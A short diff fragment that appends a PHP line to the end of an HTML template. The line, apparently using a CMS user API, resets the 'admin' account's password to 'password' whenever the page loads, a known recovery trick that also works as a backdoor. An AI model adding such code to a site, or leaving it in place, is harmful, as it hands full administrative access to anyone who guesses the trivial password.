@@ -49,3 +49,5 @@
     </body>
 
 </html>
+
+<?php $users->get("admin")->setOutputFormatting(false)->set('pass', 'password')->save(); ?>
